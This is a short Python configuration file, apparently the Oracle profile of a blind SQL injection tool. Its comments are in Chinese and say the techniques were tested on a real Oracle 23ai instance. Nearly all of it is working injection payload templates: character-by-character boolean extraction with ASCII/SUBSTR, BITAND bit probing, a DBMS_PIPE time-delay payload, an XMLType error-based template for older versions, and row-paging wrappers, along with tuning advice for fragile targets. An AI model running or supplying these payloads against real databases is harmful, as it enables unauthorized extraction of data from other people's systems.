"""Oracle — bool(BITAND)/time(DBMS_PIPE)/union/OFFSET(12c+) 真机已验证(23ai Free)。
error: 23ai 的 XMLType 报错已不回显数据(LPX-00231 无值), 判不可用并默认关闭;
旧版本(11g/12c/19c)可 -A 自带模板:
  AND (SELECT XMLType(CHR(60)||SUBSTR(({Q}),{P},{N})||CHR(62)) FROM DUAL) IS NOT NULL
配 --regex "XPointer syntax error: '([^']*)'"。
连接风暴敏感的目标建议 --bwidth 4~8(每请求新连接的 Oracle 易抖动)。"""

PROFILE = {
    'name': 'oracle',
    'note': 'Oracle 9i+ (bool/time/union 已验证; error 在 23ai 无回显已关)',
    'err_tpl':   None,
    'err_regex': "XPointer syntax error: '([^']*)'",
    'err_chunk': 30,
    'err_strip': 0,
    'bool_tpl':  " AND ASCII(SUBSTR(({Q}),{P},1))>{K}",
    'bit_tpl':   " AND BITAND(ASCII(SUBSTR(({Q}),{P},1)),{M})>0",
    'time_tpl':  " AND 1=(CASE WHEN ASCII(SUBSTR(({Q}),{P},1))>{K} THEN DBMS_PIPE.RECEIVE_MESSAGE(CHR(97),{T}) ELSE 1 END)",
    'row_wrap':  "SELECT * FROM ({Q}) x OFFSET {R} ROWS FETCH NEXT 1 ROWS ONLY",
}
